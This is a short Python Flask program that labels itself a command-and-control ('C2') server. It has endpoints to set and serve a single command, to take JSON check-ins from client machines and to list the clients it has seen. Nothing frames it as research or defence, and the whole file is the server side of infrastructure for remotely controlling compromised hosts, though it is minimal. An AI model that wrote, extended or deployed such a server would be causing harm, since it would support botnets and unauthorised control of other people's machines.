from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# 儲存指令
command = "none"

# 儲存 client 資料
clients = {}

@app.route("/")
def home():
    return "C2 Server Running 😎"

@app.route("/get_command")
def get_command():
    return command

@app.route("/set_command")
def set_command():
    global command
    command = request.args.get("cmd", "none")
    return f"Command set: {command}"

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json()
    client_id = data.get("id")

    clients[client_id] = {
        "last_seen": time.strftime("%Y-%m-%d %H:%M:%S"),
        "data": data
    }

    print("📡 Client 回報:", data)
    return "ok"

@app.route("/clients")
def get_clients():
    return jsonify(clients)

if __name__ == "__main__":
    app.run()
